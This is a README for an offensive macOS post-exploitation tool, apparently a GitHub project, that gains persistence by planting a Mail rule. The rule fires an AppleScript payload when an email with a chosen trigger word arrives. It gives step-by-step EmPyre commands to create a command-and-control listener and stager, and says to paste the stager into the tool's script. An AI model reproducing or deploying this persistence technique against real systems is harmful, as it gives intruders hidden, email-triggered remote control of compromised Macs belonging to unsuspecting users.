# MailPersist - Post-exploitation script for MacOS persistance 

## ABOUT:
This script creates a new rule in the MacOS Mail application to automatically trigger an appleScript payload when an email is recieved using a trigger word.

## INSTALL:
```
All dependancies are met on a default installation of MacOS.  With that said, you will likely want to use EmPyre
https://github.com/adaptivethreat/EmPyre
to create your appleScript payload. 
```

## USAGE:
Creating an appleScript payload with Empyre:
```
(EmPyre) > listeners
(EmPyre: listeners) > set Name mylistener
(EmPyre: listeners) > execute
(EmPyre: listeners) > usestager applescript mylistener
(EmPyre: stager/applescript) > execute
```
Open mail.py and paste the output in the specified area.  Modify the trigger word as you see fit.  
